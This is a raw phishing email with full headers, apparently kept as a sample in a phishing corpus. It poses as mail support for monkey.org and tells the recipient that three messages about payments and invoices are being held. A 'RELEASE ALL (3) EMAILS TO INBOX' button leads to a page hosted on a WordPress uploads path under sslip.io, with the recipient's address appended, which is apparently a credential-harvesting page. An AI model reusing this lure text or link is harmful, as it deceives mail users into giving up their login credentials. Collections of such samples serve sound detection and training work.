@@ -1,0 +1,213 @@
+Return-Path: amia@fmanalyst.com
+Delivered-To: jose@monkey.org
+X-FDA: 83914175016.30.7E7D61F
+Received: from short.fmanalyst.com (short.fmanalyst.com [94.156.175.79])
+	by imf07.b.hostedemail.com (Postfix) with ESMTP id 62B57A000C
+	for <jose@monkey.org>; Sun, 21 Sep 2025 19:01:06 +0000 (UTC)
+Authentication-Results: imf07.b.hostedemail.com;
+	dkim=pass header.d=fmanalyst.com header.s=dkim header.b=w+jQ8fuE;
+	spf=pass (imf07.b.hostedemail.com: domain of amia@fmanalyst.com designates
+ 94.156.175.79 as permitted sender) smtp.mailfrom=amia@fmanalyst.com;
+	dmarc=pass (policy=none) header.from=fmanalyst.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1758481266;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Y4vzIvfATHqSAs6m4f1+0wPXehLnSmMNtXznS7YC2jc=;
+	b=IAFNQrgQx3NzfygDfK3gndui2yaG8RXtBghj4MJdPNPDGC6cPGnWhs33b5bepFCIdFpjaQ
+	OGaNYPaZqPjeo9WpebC553uVFyRVFe4DE/bMC9OUA/vcLOmBWnRQ4XueBsx5KjB233v95o
+	WzsI0VsEuXPx0oGU35zkJWtBFyIa/Mk=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1758481266; a=rsa-sha256;
+	cv=none;
+	b=Wu0QGpGhr3CRZwnKRF7nKaV5yQ3kJ1CdpzPCU2mVECUw85oeEODJN5lsKzz4ZtMsUFmcZR
+	6Jq3AreCtyNfCQHM+lQQicQfRwe+DeSmQf2mCeV1Ki245zKjRvBO3W2qin7XiNV2dyGkh+
+	GN7pa9d2OD/f8JFxY1ojUgS5853Uf6A=
+ARC-Authentication-Results: i=1;
+	imf07.b.hostedemail.com;
+	dkim=pass header.d=fmanalyst.com header.s=dkim header.b=w+jQ8fuE;
+	spf=pass (imf07.b.hostedemail.com: domain of amia@fmanalyst.com designates
+ 94.156.175.79 as permitted sender) smtp.mailfrom=amia@fmanalyst.com;
+	dmarc=pass (policy=none) header.from=fmanalyst.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=fmanalyst.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=amia@fmanalyst.com;
+ bh=55dEkLAFp1EAdtAXcbXA8JgrU6Y=;
+ b=w+jQ8fuEITiTBNfhkdu9x60BsbGRYVWYfqO3Ctc2QzPRb74JN8tufE9M+sFj/KnH7iPVWa/SUv1n
+   k26I3UMp+22dOSn2A2llFYcSEOizlPx89snYecV2Ny90hguDSysiExyzPXxIPCYm40BAAPgGnXk+
+   w3kVmIvweDgyvjRHzPkeZ2n7XX+L3S2jQZeaXzRiUL7tKQfvokklSsbSDfoA7KsB3ZGcbEbQoIXr
+   9hOgEbvxeLo8yLK1Hg9qesWRMBw89UH54BTTmHr4fxfJD2Q4ApVl2WGJXELUhOMbZo7504PL8tFg
+   pr+SIa0fnxDRBDAxtlfKDFgm3BJL8oPVONA10A==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=fmanalyst.com;
+ b=uTDmarHoH7xC7H5EHRwFUkE/uObWYCo10UH0pr/Px9pPxXCWiSyhBthFVyOWBW/Xr+lzmkHzn5xQ
+   u+cM+KTwsJiJmjiqyw+efZXkBdk0kg4JZRNTOZmRRnYe8B9W7y70l1QHxkRFSdKvqpgj5jZlF20u
+   sK1pXS8CsFc0O4YzbZqNxcm6ykLasViHnvwO5CfH6+BR7Jeg/PZChlKxSogDJci5HNoSNUdAUnly
+   62az+LounGANFaxV1WavIOzvzeuTipuu2RhVM3N+Ys3/U/xxxyFmP+hjk8rCsrsN9rrMsGYsnEMG
+   S71wb7GEHd5iIOKI81KhglCPAJRNZd76KQyJoA==;
+From: Mail Support monkey.org <amia@fmanalyst.com>
+To: jose@monkey.org
+Subject: You have (3) undelivered mail to your inbox.
+Date: 18 Sep 2025 11:07:56 -0700
+Message-ID: <20250918110756.A53E32CF151D82D4@fmanalyst.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 62B57A000C
+X-Rspam-User: 
+X-Stat-Signature: eaup4jfytch4twekarer5poph84yy8cu
+X-Spam-Status: Yes, score=9.30
+X-HE-Tag: 1758481266-679693
+X-HE-Meta: 
+ U2FsdGVkX19wvH7wPB9MOKuKiBRWr98nVHqYlAVt2yIzgWnqIfqv+Op2uSSV1+P7AV+CnPPU+vdfBDIFnDnaHsL43lBn+JFNLnow1Xp82QigGhC+RDSjIhrae8ltAOlr+sXuba9KvKF1Jj4UEhMYHws2xLELHf4fvcy9xH4vD1qkzKpNJcYAygtc28if0tu1NhhkdXlHxytwcoKT9YcB8u1z1HEjJp5wxyjStlzl7+P91KsZkjEEeTzwTWK04R62/OvdkbnMm+N4tlRn3LjEUgv+oKm7JhD6NVMiUhS8GnYrnq7uiSCteZlETe4f9igvTsAdo5oDtfL/MZgGHLNPeIRopR16ukE4oVthArsxm5aBrS1mEVMeq/scJL1XYO/Dymk2v+E3DDV49gluUnigAGcy5ZTPnxHEkye1AE8vb+LTxM3RaHZLmf1CI0khHnkZr//cax3zHYjS8/j2d/9YuGe6mF7x1do9+iC0387f1Zl2Mt8AX6mfPV1YPHw3bujZqLI/m1hiw7UUCKADHwfCXNpsKvWEL1qApXY7QX94vxp9iVxgQyDpNlYwLqbHB/RuIBai7Rc4odY0LT3YJhB3+Y/bAe/97ggoAUXZlASRvASADXbl26FZupVhq6XsXkhI9jOP1gHCrjV0nVfZ8HFqL+qUqwL3ckMXF83eRASCc8sSIEfD0QDDGEXA6QG2Fpz+UY21i07iM3JM5ji8VkxRtQbKEa8ftUtqq/JtwdCB8E2Gkr891DMJBFgLolJhr/8wF5tpG7BQnM/zaz8LqM0KyBBnLFXkbUD5zmAUwwT9NhuT4sldXwOOlagW+Tg4XSmmmce6GnPf2s86S2BZQj0eRoRXlWliIHqfGQcRNRZ+qdC/v29UcMdGzewPI1COPdZ/1lyAPBAWytc76E05l0u0A0K8EPlSCmgjyFEh/A/RyOX09F65YMVvHxwiXHQVmbck3lhMsPIKA1iNQJ2mHr6NY2zdDvs
+ HpM+2InZnW9xAYoMTTAogLotf1CUFgBe3wJ10zfdRSesdBAuWbl/C1f2Kak5wUgsZ38yOxoG8TOHjN8jzfcJUL1sEnRpSo9+SLIIhVOsSYhNjb9+aXpU2zQBwTRMGSjoTzjliK/uAWYBKg6nRfFhRksZNasZKL3brnX6FiCvB2c0YzD4cAkfFvd2mA9wAwBKuOnV59EuZ3H6WMiLxy+Wn2ZAgoZERyCnka4LCYsUvGRZTFkbmG8vvbKDz8xXtXQmM6moI8WWwcnDZoTZuXy5VlNOtDpQBJGurXuXXVoeuznYHMOdYkzNARxZPolE5klKa/gnpm1mJ1GOMFsMy8GKUtA+x4plP0UjiQpLyljaDVclHycs=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 398
+
+<!DOCTYPE html>
+
+<html><head>
+<title>Email</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    font-size: 14px;
+    color: #333;
+}
+=2Econtainer {
+    width: 80%;
+    margin: auto;
+    padding: 20px;
+    border: 1px solid #ddd;
+}
+=2Eheader {
+    background-color: #003399;
+    color: white;
+    text-align: center;
+    padding: 10px;
+    font-size: 24px;
+}
+=2Econtent {
+    margin-top: 20px;
+}
+=2Euser-info {
+    margin-bottom: 10px;
+}
+=2Etable {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 20px;
+}
+=2Etable th, .table td {
+    border: 1px solid #ddd;
+    padding: 8px;
+    text-align: left;
+}
+=2Etable th {
+    background-color: #f0f0f0;
+}
+=2Ebutton {
+    background-color: #007bff;
+    color: white;
+    padding: 10px 20px;
+    text-decoration: none;
+    border-radius: 5px;
+    display: inline-block;
+    margin-top: 20px;
+}
+=2Efooter {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 12px;
+    color: #777;
+}
+</style>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"font-family: Arial, sans-serif;
+    font-size: 14px;
+    color: #333">
+<div style=3D"width: 80%;
+    margin: auto;
+    padding: 20px;
+    border: 1px solid #ddd" class=3D"container">
+    <div style=3D"background-color: #003399;
+    color: white;
+    text-align: center;
+    padding: 10px;
+    font-size: 24px" class=3D"header">
+        uob-edu.net
+    </div>
+    <div style=3D"margin-top: 20px" class=3D"content">
+        <div style=3D"margin-bottom: 10px" class=3D"user-info">
+            User: info@uob-edu.net
+        </div>
+        <div>
+            Time: 9/6/2025 1:57:24 p.m.
+        </div>
+        <p>You have (3) undelivered mail to your inbox.</p>
+        <p>This is due to a system delay in your mail server to process mai=
+l. Kindly click the link below to release all your pending mails on the ser=
+ver.</p>
+=20=20=20=20=20=20=20=20
+        <table style=3D"width: 100%;
+    border-collapse: collapse;
+    margin-top: 20px" class=3D"table">
+            <thead>
+                <tr>
+                    <th>Action</th>
+                    <th>Recipient</th>
+                    <th>Subject</th>
+                    <th>Date</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Release</td>
+                    <td>info@uob-edu.net</td>
+                    <td>RE: Re: Payment</td>
+                    <td>9/6/2025 1:57:24 p.m.</td>
+                </tr>
+                <tr>
+                    <td>Release</td>
+                    <td>info@uob-edu.net</td>
+                    <td>FW: Proforma Invoice Urgently Needed</td>
+                    <td>9/6/2025 1:57:24 p.m.</td>
+                </tr>
+                <tr>
+                    <td>Release</td>
+                    <td>info@uob-edu.net</td>
+                    <td>Re: Change Of Account.</td>
+                    <td>9/6/2025 1:57:24 p.m.</td>
+                </tr>
+            </tbody>
+        </table>
+=20=20=20=20=20=20=20=20
+        <div style=3D"text-align: center;">
+            <a href=3D"https://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.1=
+18.199.sslip.io/wp-content/uploads/western/index.html#jose@monkey.org"><a s=
+tyle=3D"background-color: #007bff;
+    color: white;
+    padding: 10px 20px;
+    text-decoration: none;
+    border-radius: 5px;
+    display: inline-block;
+    margin-top: 20px" class=3D"button" href=3D"https://wordpress-v8g0oc80kk=
+kg04s4ww4w4c04.196.251.118.199.sslip.io/wp-content/uploads/western/index.ht=
+ml#jose@monkey.org">RELEASE ALL (3) EMAILS TO INBOX</a></a>
+        </div>
+    </div>
+    <div style=3D"margin-top: 20px;
+    text-align: center;
+    font-size: 12px;
+    color: #777" class=3D"footer">
+        &copy; 2025 danuu.com Source: Mail Support.
+    </div>
+</div>
+
+</body></html>
+
